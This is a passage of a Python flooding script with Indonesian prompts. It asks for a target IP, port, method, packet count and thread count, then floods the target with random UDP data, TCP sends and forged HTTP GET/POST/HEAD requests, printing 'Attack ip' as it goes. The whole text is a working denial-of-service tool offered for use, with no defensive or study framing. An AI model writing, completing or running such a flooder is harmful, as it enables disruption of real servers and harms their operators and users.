...
╚══════╝ ╚═════╝    ╚═╝      ╚═╝   
      ...
      | UDP | TCP | GET |
""")
ip = str(input("\033[94m IP WIBU \033[1;31;40m  ====> : "))
port = int(input(" \033[94m PORT WIBU \033[1;31;40m====> : "))
choice = str(input(" \033[94mMETHOD \033[1;31;40m     ====> : "))
times = int(input(" \033[94mPAKET BUAT WIBU \033[1;31;40m      ====> : "))
threads = int(input("\033[94m HADIA BUAT WIBU \033[1;31;40m    ====> : "))

def udp():
	data = random._urandom(10300)
	while True:
		try:
...
def tcp():
	...
	while True:
		try:
			...
			s.close()
			print("\033[1;31;40m Attack ip %s port %s"%(ip,port))
...
def Headers(method):
    ...
    if method == "get" or method == "head":
        post_host = "POST /Your_Server_Bypassed_By_JetX HTTP/1.1\r\nHost: " + ip + "\r\n"
...
os.system('color ' +random.choice(['D'])+ " & cls & title Lutt [ COLI ATTACK!! MAMPUS]")
def get():
    header = Headers("get")
    i = random.choice(("[*]","[!]","[#]"))
    data = random._urandom(10299)
    if choice == "1":
        get_host = "GET /Your_Server_Bypassed_By_ZAVGHT HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Your_Server_Bypassed_By_ZAVGHT HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ...
            for x in range(time):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print("\033[1;36;40m Attack ip %s port %s"%(ip,port))
        except socket.error:
            s.close()
            print("\033[1;36;40m Attack ip %s port %s"%(ip,port))
